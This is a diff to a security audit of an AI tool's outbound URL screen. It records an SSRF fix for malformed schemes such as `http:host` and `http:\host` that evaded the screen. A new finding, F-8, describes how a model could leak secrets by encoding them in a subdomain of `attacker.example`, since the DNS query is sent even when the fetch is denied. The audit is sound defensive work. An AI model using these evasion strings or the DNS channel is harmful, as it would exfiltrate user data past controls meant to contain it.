@@ -34,7 +34,7 @@ test; **DECLINED** means a recorded decision not to fix, with reasoning;
 |---|---|---|---|
 | H-1 | C-1 open — `graph_struct_search`/`graph_repo_map` are TRUSTED source readers | **FIXED** | `0169d10` — demote both + strip `signature`; amendment 2026-08-08 (c) + decision 29 |
 | H-2 | C-2 open — contamination clears on any newline-terminated byte | **FIXED** | `2c40136` — reset removed, not re-armed; amends decision 15 |
-| H-3 | SSRF — `http:/host`, `http:host`, `http:\host` evade the screen | **OPEN** | |
+| H-3 | SSRF — `http:/host`, `http:host`, `http:\host` evade the screen | **FIXED** | `e5f3627` — scheme parsed not matched; 15,840-case generated corpus |
 | H-4 | Every shipped rule defeated by invisible whitespace | **FIXED** | `5920c92` — rules + normalizer + corpus; 20/50 evading → 0/53 |
 | H-5 | Update channel inert by construction (302 vs redirect ban) | **FIXED** | `5920c92` — `raw.githubusercontent.com` branch + the missing guard |
 | H-6 | Bundle authenticated by TLS + repo-write only | **DECLINED** | locked decision 28 — key would live inside the blast radius |
@@ -54,6 +54,7 @@ test; **DECLINED** means a recorded decision not to fix, with reasoning;
 | F-5 | `/graph_run` + `/mcp/call` share H-8's tab half | **OPEN** | raised by the fix run; a decision, not a bug |
 | F-6 | H-2's decode proof degrades silently if the CLI drops `sessionId` | **OPEN** | raised by the fix run; wants a drift canary |
 | F-7 | Auto-injection still pushes signatures into a contaminated tab | **OPEN** | raised by the fix run; bounds what H-1 claims |
+| F-8 | A denied URL still leaks its hostname to DNS | **OPEN** | raised by the fix run; bounds what "denied" means |
 
 Everything in the MEDIUM table below is **OPEN** unless its row says otherwise.
 
@@ -183,7 +184,13 @@ recognised entry decoded" out instead of the raw offset delta); or decouple
 
 ### H-3 — SSRF: the screen matches literal `http://`, the fetcher accepts `http:`, `http:/`, `http:\`
 
-> **STATUS: OPEN.** The reviewer compiled the extractor against the app’s own `url 2.5.8` and executed it, so the table below is observed output rather than inference.
+> **STATUS: FIXED — `e5f3627`.** `URL_PREFIXES` → `URL_SCHEMES` (`["http:", "https:"]`): the slashes left the constant and are **parsed, not matched**. `scan_scheme_runs` matches the scheme case-insensitively, consumes the slash run (zero length allowed), and emits a candidate normalized to `//`. `\` is dropped from the terminator set only *inside a scheme-bearing run* — it stays a terminator for `scan_bare_authorities`, where it is a Windows path separator.
+>
+> **The test is the fix.** This was the fourth attempt at this class (C-4 was closed in three separate commits, each fixing the reported strings rather than the rule), so the 29-literal table was demoted to a supplementary pin and replaced as the guard by a **generated corpus**: scheme × slash-run × infix × authority × tail = **15,840 cases**, oracle `Url::parse` from the pinned `url 2.5.8`, applied both as-written and as WHATWG strips it, asserted both bare and buried in prose. Its bound is a parallel **5,280-case public control** that must all pass, so an extractor that denies everything fails too. The infix axis is *every character the extractor treats as a terminator*, so the corpus **audits** the `is_scheme_only` exemption rather than restating it. Verified RED against the pre-fix extractor: **1170 of 5760 oracle hits evaded; 0 after.**
+>
+> **`is_scheme_only` KEPT, argument narrowed.** Row 5 (`http://\10.0.0.1`) turned out to be an *extraction* defect wearing the exemption's clothes — after the fix that string extracts and is denied, and the exemption never sees it. The old doc was wrong twice, not once: `\` is a slash for special schemes, **and** quotes are not forbidden host code points either. The replacement reasoning is per-terminator and machine-checked by the corpus rather than asserted.
+>
+> **Bonus, pre-existing false *refusal* found by the public control:** the flat trailing-punctuation trim ate the closing bracket of any bracketed-IPv6 URL ending at its authority, so `http://[2001:db8::1]` became unparseable and the deny-on-unparseable rule refused a *public* target. The trim is now balance-aware. Same screen/parser disagreement as H-3, pointing the other way.
 
 `offload/outbound.rs:239,343-364,738-749`
 
@@ -917,3 +924,29 @@ an EXTERNAL-latched tab still *sees* a demoted tool advertised and learns of the
 latch by being refused. Pre-existing and identical for `graph_snippet`; H-1's
 tests assert the two paths separately rather than deriving one from the other,
 which is the right posture regardless.
+
+### F-8 — a denied URL still leaks its hostname to DNS
+
+`offload/outbound.rs` — the resolution step inside `screen_urls`
+
+Raised while closing H-3, and it **bounds what a denial means**. To decide
+whether a hostname points into a denied range, the screen must resolve it. That
+resolution happens *before* the verdict, so a model can encode data in a
+subdomain — `http://<base32-of-secret>.attacker.example/` — and the query
+reaches the attacker's authoritative nameserver **whether or not the fetch is
+subsequently refused**.
+
+Low bandwidth, and inherent to the design rather than introduced by H-3: any
+check of a *name* against denied *addresses* requires resolving it, and this
+property has existed since the screen was written. H-3 widens the set of strings
+that reach resolution slightly (`http:host` with no slashes now extracts where it
+previously did not), which is required by the screen/parser agreement invariant
+and is the correct trade.
+
+Recorded because the activity row and the user-facing story both say *denied*,
+and a reader reasonably infers "nothing left the machine". That inference is
+false. Options if it is ever worth closing: resolve only after a literal-IP
+fast-path rejects, cache negative verdicts per host, or route screening
+resolution through a resolver whose queries are themselves screened — none
+obviously worth it for a channel this narrow, which is why this is recorded and
+not scheduled.
